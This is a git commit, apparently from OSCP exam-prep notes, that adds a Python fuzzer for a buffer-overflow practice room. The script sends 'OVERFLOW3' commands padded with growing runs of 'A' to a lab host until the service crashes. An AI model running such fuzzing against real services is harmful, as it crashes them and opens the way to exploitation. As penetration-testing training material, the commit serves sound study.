02a98baf330c3a1a68145333f4ddc927ce9ad755
Dale Dunlop <Dalejohndunlop@gmail.com>
2022-10-10 23:56:06 +0100

    Extras

---
+++ Buffer Overflow OSCP Prep/Overflow 3/fuzzer.py
@@ -0,0 +1,24 @@
+import socket, time, sys
+
+ip = "10.10.149.5"
+
+port = 1337
+timeout = 5
+prefix = "OVERFLOW3 "
+
+string = prefix + "A" * 50
+
+while True:
+  try:
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+      s.settimeout(timeout)
+      s.connect((ip, port))
+      s.recv(1024)
+      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
+      s.send(bytes(string, "latin-1"))
+      s.recv(1024)
+  except:
+    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
+    sys.exit(0)
+  string += 50 * "A"
+  time.sleep(1)
